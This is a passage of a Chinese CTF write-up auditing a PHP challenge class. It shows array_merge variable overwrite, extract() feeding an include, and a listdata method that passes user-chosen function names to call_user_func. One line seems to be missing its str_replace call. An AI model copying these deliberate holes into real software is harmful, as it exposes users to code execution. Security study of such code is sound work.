        <span class="token variable">$param</span> <span class="token operator">=</span> <span class="token variable">$where</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token variable">$_params</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$params</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token variable">$_params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'list'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$params</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'action='</span> <span class="token operator">.</span> <span class="token variable">$params</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$params</span> <span class="token keyword">as</span> <span class="token variable">$t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'='</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$val</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">,</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'='</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$var</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">continue</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$system</span><span class="token punctuation">[</span><span class="token variable">$var</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$system</span><span class="token punctuation">[</span><span class="token variable">$var</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$val</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$param</span><span class="token punctuation">[</span><span class="token variable">$var</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$val</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// action</span>
        <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$system</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

            <span class="token keyword">case</span> <span class="token string single-quoted-string">'function'</span><span class="token punctuation">:</span>

                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">return</span>  <span class="token string single-quoted-string">'hacker!!'</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">return</span> <span class="token string single-quoted-string">'hacker!!'</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>

                <span class="token variable">$force</span> <span class="token operator">=</span> <span class="token variable">$param</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'force'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$force</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$param</span> <span class="token keyword">as</span> <span class="token variable">$var</span> <span class="token operator">=></span> <span class="token variable">$t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'param'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                            <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$n</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>
                        <span class="token punctuation">&#125;</span>
                    <span class="token punctuation">&#125;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

                        <span class="token variable">$rt</span> <span class="token operator">=</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                        <span class="token variable">$rt</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                    <span class="token keyword">return</span> <span class="token variable">$rt</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">return</span> <span class="token constant">null</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token keyword">case</span> <span class="token string single-quoted-string">'list'</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">date</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token constant">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>先看构造方法</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">private</span> <span class="token variable">$date</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'version'</span><span class="token operator">=></span><span class="token string single-quoted-string">'1.0'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'img'</span><span class="token operator">=></span><span class="token string single-quoted-string">'https://www.apache.org/img/asf-estd-1999-logo.jpg'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">private</span> <span class="token variable">$template</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">date</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">date</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="array-merge函数"><a href="#array-merge函数" class="headerlink" title="array_merge函数"></a>array_merge函数</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$arr1</span><span class="token punctuation">,</span><span class="token variable">$arr2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol>
<li>合并一个或多个数组，合并后参数2数组的内容附加在参数1之后。</li>
<li>同时如果参数1、2数组中有相同的字符串键名，则合并后为参数2数组中对应键的值，会发生覆盖。注：即造成<strong>变量覆盖</strong></li>
<li>然而，如果数组包含数字键名，后面的值将不会覆盖原来的值，而是附加到后面。</li>
<li>如果只给了一个数组并且该数组是数字索引的，则键名会以连续方式重新索引。</li>
</ol>
<p>demo：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$array1</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"color"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"red"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$array2</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"b"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"color"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"green"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"shape"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"trapezoid"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">,</span> <span class="token variable">$array2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>输出</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">Array</span>
<span class="token punctuation">(</span>
    <span class="token punctuation">[</span>color<span class="token punctuation">]</span> <span class="token operator">=></span> green
    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=></span> <span class="token number">2</span>
    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=></span> <span class="token number">4</span>
    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=></span> a
    <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=></span> b
    <span class="token punctuation">[</span>shape<span class="token punctuation">]</span> <span class="token operator">=></span> trapezoid
    <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=></span> <span class="token number">4</span>
<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="代码审计部分"><a href="#代码审计部分" class="headerlink" title="代码审计部分"></a>代码审计部分</h2><p>然后看display方法</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">display</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">,</span><span class="token variable">$space</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">date</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getTempName</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">,</span><span class="token variable">$space</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">template</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一眼extract变量覆盖和include文件包含，跟踪到getTempName方法</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getTempName</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">,</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">template</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'./template/admin/'</span><span class="token operator">.</span><span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">template</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">template</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./template/index.html'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>检查传入getTempName()方法的形参<code>$dir</code>值是否为admin，是的话就进行字符串的拼接与替换，然后检查是否为文件</p>
<p>这里的str_replace替换语句明显是过滤了文件包含目录穿越的方法，所以我们还需要寻找别的利用点</p>
<p>注意到这个方法里提到了两个路由，尝试访问一下，其中&#x2F;template&#x2F;index.html返回404，&#x2F;template&#x2F;admin&#x2F;成功返回一段php代码，ctrl+u查看一下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">&lt;!--&lt;img src="<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$img</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>">--></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">listdata</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"action=list module=<span class="token interpolation"><span class="token variable">$mod</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h6</span><span class="token punctuation">></span></span>version: <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$version</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h6</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>在这里调用了listdata方法，跟踪过去</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">listdata</span><span class="token punctuation">(</span><span class="token variable">$_params</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$system</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string single-quoted-string">'db'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'app'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'num'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'sum'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'form'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'page'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'site'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'flag'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'not_flag'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'show_flag'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'more'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'catid'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'field'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'order'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'space'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'table'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'table_site'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'total'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'join'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'on'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'action'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'return'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'sbpage'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'module'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'urlrule'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'pagesize'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'pagefile'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token variable">$param</span> <span class="token operator">=</span> <span class="token variable">$where</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token variable">$_params</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$params</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token variable">$_params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'list'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$params</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'action='</span> <span class="token operator">.</span> <span class="token variable">$params</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$params</span> <span class="token keyword">as</span> <span class="token variable">$t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'='</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$val</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">,</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'='</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$var</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$system</span><span class="token punctuation">[</span><span class="token variable">$var</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$system</span><span class="token punctuation">[</span><span class="token variable">$var</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$val</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$param</span><span class="token punctuation">[</span><span class="token variable">$var</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$val</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// action</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$system</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

        <span class="token keyword">case</span> <span class="token string single-quoted-string">'function'</span><span class="token punctuation">:</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span>  <span class="token string single-quoted-string">'hacker!!'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token string single-quoted-string">'hacker!!'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            <span class="token variable">$force</span> <span class="token operator">=</span> <span class="token variable">$param</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'force'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$force</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$param</span> <span class="token keyword">as</span> <span class="token variable">$var</span> <span class="token operator">=></span> <span class="token variable">$t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'param'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$n</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token variable">$rt</span> <span class="token operator">=</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
